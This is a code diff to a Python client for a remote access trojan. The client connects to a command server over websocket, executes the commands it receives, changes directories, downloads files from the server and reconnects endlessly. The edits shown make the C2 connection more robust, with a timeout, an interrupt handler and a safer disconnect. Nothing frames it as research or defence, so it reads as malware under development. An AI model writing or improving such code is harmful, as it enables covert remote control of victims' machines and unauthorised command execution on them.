@@ -64,7 +64,6 @@ def execute_command(command):
             os.chdir(target_dir)
             return f"Changed directory to {os.getcwd()}"
         elif command.strip().lower().startswith("download "):
-            # Handle file download: download <filename>
             filename = command.strip().split("download ", 1)[1].strip()
             download_url = f"{SERVER_URL}/download/{filename}"
             dest_path = os.path.join(os.getcwd(), filename)
@@ -76,10 +75,8 @@ def execute_command(command):
         return f"Error executing command: {e}"
 
 def main():
-    sio = None
+    sio = Client()
     try:
-        sio = Client()
-        
         @sio.event
         def connect():
             print("[*] Connected to RAT server")
@@ -119,15 +116,18 @@ def main():
 
         while True:
             try:
-                sio.connect(SERVER_URL, transports=['websocket'])
+                print(f"[*] Attempting to connect to {SERVER_URL}")
+                sio.connect(SERVER_URL, transports=['websocket'], wait_timeout=10)
                 sio.wait()
                 break
             except Exception as e:
-                print(f"[!] Connection failed: {e}")
+                print(f"[!] Connection failed: {str(e)}")
                 print("[*] Retrying in 5 seconds...")
                 time.sleep(5)
+    except KeyboardInterrupt:
+        print("[*] Shutting down client...")
     finally:
-        if sio is not None:
+        if sio.connected:
             sio.disconnect()
 
 if __name__ == "__main__":
